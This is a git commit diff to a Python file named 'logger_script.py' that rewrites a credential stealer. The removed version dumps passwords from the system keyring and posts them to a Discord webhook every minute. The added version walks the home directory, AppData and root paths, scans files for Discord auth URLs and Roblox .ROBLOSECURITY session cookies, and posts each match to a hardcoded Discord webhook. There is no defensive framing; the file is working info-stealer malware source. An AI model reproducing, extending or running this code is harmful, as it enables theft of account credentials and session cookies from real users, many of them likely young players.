09e0647de6903f8af9cad4da39369492e4a4acd0
wanderingfu <Thegoatleopold10@gmail.com>
2024-05-18 17:21:49 -0500

    Update logger_script.py

--- logger_script.py
+++ logger_script.py
@@ -1,24 +1,44 @@
-import keyring
+import os
+import re
 import requests
-import time
 
-def steal_passwords():
-    all_passwords = {}
-    for service_name in keyring.get_services():
-        for username in keyring.get_keys(service_name):
-            password = keyring.get_password(service_name, username)
-            all_passwords[f'{service_name}:{username}'] = password
-    return all_passwords
+# Regular expressions for Discord and Roblox credentials
+discord_re = re.compile(r'discord\.com/api/v\d+/auth\?client_id=\d+&scope=.*&redirect_uri=(https?:\/\/[^\s]+)&response_type=code')
+roblox_re = re.compile(r'ROBLOSECURITY=.*')
 
-def send_passwords_to_discord(passwords):
-    webhook_url = 'https://discord.com/api/webhooks/1241497177771999233/IBBDUMt981jObFoKodixaPC7TWaV-apMYGUWYnyizwUtWWiKKZhp4Wzq91dFbGmFcuhX'
-    message = ''
-    for app, password in passwords.items():
-        message += f'{app}: {password}\n'
-    requests.post(webhook_url, data={'content': message})
+# Directories to search
+dirs_to_search = [
+    os.path.expanduser('~'),
+    os.path.join(os.path.expanduser('~'), 'AppData'),
+    os.path.join(os.path.expanduser('~'), 'Documents'),
+    os.path.join(os.path.expanduser('~'), 'Downloads'),
+    os.path.join(os.path.expanduser('~'), 'Saved Games'),
+    os.path.join(os.path.expanduser('~'), 'Pictures'),
+    os.path.join(os.path.expanduser('~'), 'Videos'),
+    os.path.join(os.path.expanduser('~'), 'Music'),
+    os.path.join(os.path.expanduser('~'), 'Desktop'),
+    '/',
+    '/home',
+    '/root',
+]
 
-while True:
-    all_passwords = steal_passwords()
-    if all_passwords:
-        send_passwords_to_discord(all_passwords)
-        time.sleep(60)
+# Discord webhook URL
+webhook_url = "https://discord.com/api/webhooks/1241497177771999233/IBBDUMt981jObFoKodixaPC7TWaV-apMYGUWYnyizwUtWWiKKZhp4Wzq91dFbGmFcuhX"
+
+# Search for credentials
+for dir in dirs_to_search:
+    for root, dirs, files in os.walk(dir):
+        for file in files:
+            file_path = os.path.join(root, file)
+            with open(file_path, 'r') as f:
+                data = f.read()
+                discord_matches = discord_re.findall(data)
+                roblox_matches = roblox_re.findall(data)
+                if discord_matches:
+                    print(f'Discord credentials found in {file_path}: {discord_matches}')
+                    # Send Discord credentials to webhook
+                    requests.post(webhook_url, json={"content": f"Discord credentials found in {file_path}: {discord_matches}"})
+                if roblox_matches:
+                    print(f'Roblox credentials found in {file_path}: {roblox_matches}')
+                    # Send Roblox credentials to webhook
+                    requests.post(webhook_url, json={"content": f"Roblox credentials found in {file_path}: {roblox_matches}"})
